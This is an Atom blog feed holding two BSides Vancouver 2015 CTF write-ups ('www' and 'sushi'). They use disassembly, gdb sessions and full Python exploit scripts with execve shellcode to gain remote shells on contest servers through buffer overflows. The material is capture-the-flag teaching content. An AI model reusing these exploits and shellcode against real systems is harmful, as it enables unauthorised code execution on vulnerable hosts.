<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-03-18T20:55:20+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[BSides Vancouver CTF - WWW]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/"/>
    <updated>2015-03-18T20:36:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www</id>
    <content type="html"><![CDATA[<p>After solving <code>sushi</code>, there were plenty of pwnables left to choose from. Next up was <code>www</code>!</p>

<!-- more -->


<p><code>www</code> was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with <code>sushi</code>, I decided to inspect the binary in <code>gdb-peda</code> right away:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>Again, no protections in place. Running the binary reveals what it is trying to do:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>Welcome to www! Please give me two strings to have them echoed back to you!
</span><span class='line'>buffers at 0xffffd4c4 and 0xffffd3c4, ready <span class="k">for</span> input!
</span><span class='line'>AAAAAA
</span><span class='line'>BBBBBB
</span><span class='line'>AAAAAA
</span><span class='line'>
</span><span class='line'>BBBBBB
</span><span class='line'>
</span><span class='line'>Stack canary created: &gt;tC<span class="o">[</span>hbw<span class="o">]</span>
</span><span class='line'>Better luck next <span class="nb">time</span>, eh?
</span></code></pre></td></tr></table></div></figure>


<p>Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called <code>copybuf</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0804873c &lt;copybuf&gt;:
</span><span class='line'> 804873c: <span class="m">55</span>                      push   ebp
</span><span class='line'> 804873d: <span class="m">89</span> e5                   mov    ebp,esp
</span><span class='line'> 804873f: <span class="m">83</span> ec <span class="m">38</span>                sub    esp,0x38
</span><span class='line'> 8048742: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">08</span> <span class="m">09</span> <span class="m">00</span> <span class="m">00</span>    mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x9
</span><span class='line'> 8048749: <span class="m">00</span>
</span><span class='line'> 804874a: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">04</span> <span class="m">68</span> 9d <span class="m">04</span>    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8049d68 <span class="p">;</span> canary
</span><span class='line'> 8048751: <span class="m">08</span>
</span><span class='line'> 8048752: 8d <span class="m">45</span> eb                lea    eax,<span class="o">[</span>ebp-0x15<span class="o">]</span>
</span><span class='line'> 8048755: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 8048758: e8 c3 fe ff ff          call   <span class="m">8048620</span> &lt;strncpy@plt&gt;
</span><span class='line'> 804875d: 8b <span class="m">45</span> <span class="m">08</span>                mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
</span><span class='line'> 8048760: <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'> 8048764: 8d <span class="m">45</span> db                lea    eax,<span class="o">[</span>ebp-0x25<span class="o">]</span>                <span class="p">;</span> first buffer is copied here
</span><span class='line'> 8048767: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804876a: e8 <span class="m">41</span> fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
</span><span class='line'> 804876f: 8b <span class="m">45</span> 0c                mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>       <span class="p">;</span> ebp+0xc <span class="o">=</span> second input
</span><span class='line'> 8048772: <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax            
</span><span class='line'> 8048776: 8b <span class="m">45</span> <span class="m">08</span>                mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>       <span class="p">;</span> overflow this pointer with <span class="nb">exit</span>@got
</span><span class='line'> 8048779: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804877c: e8 2f fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
</span><span class='line'> <span class="p">;</span> check_cookie:
</span><span class='line'> 8048781: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">04</span> <span class="m">68</span> 9d <span class="m">04</span>    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8049d68 <span class="p">;</span> canary
</span><span class='line'> 8048788: <span class="m">08</span>
</span><span class='line'> 8048789: 8d <span class="m">45</span> eb                lea    eax,<span class="o">[</span>ebp-0x15<span class="o">]</span>
</span><span class='line'> 804878c: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804878f: e8 bc fd ff ff          call   <span class="m">8048550</span> &lt;strcmp@plt&gt;
</span><span class='line'> 8048794: <span class="m">89</span> <span class="m">45</span> f4                mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
</span><span class='line'> 8048797: <span class="m">83</span> 7d f4 <span class="m">00</span>             cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x0
</span><span class='line'> 804879b: <span class="m">74</span> <span class="m">18</span>                   je     80487b5 &lt;copybuf+0x79&gt;        <span class="p">;</span> <span class="k">if</span> canary check fails, call <span class="nb">exit</span>@plt -&gt; overwrite
</span><span class='line'> 804879d: c7 <span class="m">04</span> <span class="m">24</span> <span class="m">30</span> 8a <span class="m">04</span> <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048a30
</span><span class='line'> 80487a4: e8 <span class="m">17</span> fe ff ff          call   80485c0 &lt;puts@plt&gt;
</span><span class='line'> 80487a9: c7 <span class="m">04</span> <span class="m">24</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x0
</span><span class='line'> 80487b0: e8 2b fe ff ff          call   80485e0 &lt;<span class="nb">exit</span>@plt&gt;
</span><span class='line'> <span class="p">;</span> cookie_OK:
</span><span class='line'> 80487b5: c9                      leave
</span><span class='line'> 80487b6: c3                      ret
</span></code></pre></td></tr></table></div></figure>


<p>In short, the program takes two inputs and uses <code>strcpy()</code> to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite on of the arguments to the second <code>strcpy()</code>: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I choose to overflow the pointer to the second buffer with the address of <code>exit@plt</code>. This way, after overwriting the stack canary, the program will try to exit, but <code>exit@plt</code> will point to attacker-controlled shellcode on the stack.</p>

<p>Putting it all together:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pQ</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 17284))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;www.termsec.net&#39;</span><span class="p">,</span> <span class="mi">17284</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;(0x[0-9a-f]+)&#39;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
</span><span class='line'><span class="n">buf1_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'><span class="n">buf2_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[~] buf1: 0x</span><span class="si">%lx</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">buf1_addr</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[~] buf2: 0x</span><span class="si">%lx</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">buf2_addr</span>
</span><span class='line'>
</span><span class='line'><span class="c"># first input will overwrite the pointer that is used for the second strcpy </span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">45</span>       <span class="c"># padding</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049d10</span><span class="p">)</span>    <span class="c"># we&#39;ll overwrite exit@plt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">buf2_addr</span><span class="p">)</span> <span class="c"># restore this on the stack, otherwise it will be partially overwritten</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># second input, used in second strcpy. By now, that strcpy will call:</span>
</span><span class='line'><span class="c"># strcpy(0x8049d10, buffer2)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">buf2_addr</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>    <span class="c"># overwrite exit@plt with the address where the shellcode starts</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] enjoy your shell&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/www-200<span class="nv">$ </span>python ./www.py
</span><span class='line'><span class="o">[</span>~<span class="o">]</span> buf1: 0xbfa660d4
</span><span class='line'><span class="o">[</span>~<span class="o">]</span> buf2: 0xbfa65fd4
</span><span class='line'>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> enjoy your shell
</span><span class='line'>id
</span><span class='line'>/bin//sh: 1: id: not found
</span><span class='line'>cat flag.txt
</span><span class='line'>flag<span class="o">{</span>K33P_ST4T1C_L1K3_W00L_F4BR1C<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Vancouver CTF - Sushi]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/"/>
    <updated>2015-03-18T20:15:54+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi</id>
    <content type="html"><![CDATA[<p>At the very last minute, we decided to join BSides Vancouvers&#8217; CTF. Sushi was a 100 point pwnable.</p>

<!-- more -->


<p>We&rsquo;re given the binary (and the libraries are available if need be &ndash; really nice, no guessing). Upon running it, it gives us some address and asks for money:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Deposit money <span class="k">for</span> sushi here: 0x7ffc068ccfe0
</span><span class='line'>aaaaaaaa
</span><span class='line'>Sorry, <span class="nv">$0</span>.97 is not enough.
</span></code></pre></td></tr></table></div></figure>


<p>It seems to take the first character <code>a</code> (0x61 or 97) and use that. After fruitlessly trying to trigger a format string vulnerability, I disassembled the binary and checked out it in <code>gdb-peda</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>Okay, no protections whatsoever. This means that the stack is executable too. The idea of string format vulnerability was quickly replaced with a good old buffer overflow:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;&quot;.join([&quot;%04d&quot; % x for x in range(200)])&#39;</span> <span class="p">|</span> ./sushi
</span><span class='line'>Deposit money <span class="k">for</span> sushi here: 0x7ffd0aa1edb0
</span><span class='line'>Sorry, <span class="nv">$0</span>.48 is not enough.
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>gdb ./sushi core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="sb">`</span>./sushi<span class="err">&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x00000000004005f2 in ?? ()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/i <span class="nv">$rip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x4005f2:    ret
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/2wx <span class="nv">$rsp</span>
</span><span class='line'>0x7ffd0aa1edf8:   0x38313030  0x39313030
</span></code></pre></td></tr></table></div></figure>


<p>Upon supplying a large buffer, the program crashes. Apparently, the saved return address is overwritten with <code>00180019</code>, so now I had the offset. The program crashes upon executing the <code>ret</code> statement at <code>0x4005f2</code> because the address does not point to a valid memory location.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*(18*4)+&quot;BBBBCCCC&quot;&#39;</span> <span class="p">|</span> ./sushi
</span><span class='line'>Deposit money <span class="k">for</span> sushi here: 0x7ffdcfd360b0
</span><span class='line'>Sorry, <span class="nv">$0</span>.65 is not enough.
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>gdb ./sushi core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="sb">`</span>./sushi<span class="s1">&#39;.</span>
</span><span class='line'><span class="s1">Program terminated with signal 11, Segmentation fault.</span>
</span><span class='line'><span class="s1">#0  0x00000000004005f2 in ?? ()</span>
</span><span class='line'><span class="s1">gdb-peda$ x/2wx $rsp</span>
</span><span class='line'><span class="s1">0x7ffdcfd360f8:  0x42424242  0x43434343</span>
</span><span class='line'><span class="s1">gdb-peda$ x/s 0x7ffdcfd360b0</span>
</span><span class='line'><span class="s1">0x7ffdcfd360b0:   &#39;</span>A<span class="err">&#39;</span> &lt;repeats <span class="m">72</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;BBBBCCCC&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>What&rsquo;s more, each time upon running <code>sushi</code>, the program supplies the address of the buffer it is using! In other words, that&rsquo;s a nice place for shellcode!</p>

<p>The program uses <code>gets()</code> to get the input:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0x4005c5:  call  0x400480 &lt;gets@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>This means that we can send null bytes, which we need to overwrite the saved return address with the address of our buffer. These things together (and the fact that the vulnerable binary is ran on a remote box) meant that it had to be run from a <code>socat</code> process:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>socat TCP-LISTEN:4000,fork,reuseaddr EXEC:./sushi
</span></code></pre></td></tr></table></div></figure>


<p>Next was writing a simple exploit in python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pQ</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 4000))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;sushi.termsec.net&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'><span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">&#39;(0x[0-9a-f]+)&#39;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[~] stack addr: 0x</span><span class="si">%lx</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">stack_addr</span>
</span><span class='line'>
</span><span class='line'><span class="c"># simple x64 execve shellcode</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\4</span><span class="s">8</span><span class="se">\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05</span><span class="s">&quot;</span>
</span><span class='line'><span class="c"># payload must overflow saved return address on stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">72</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
</span><span class='line'><span class="c"># we&#39;re given the address of our (executable!) buffer on the stack, so use that as return address</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">pQ</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>It ran locally after a bit of fine-tuning, so the proof was in the pudding:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
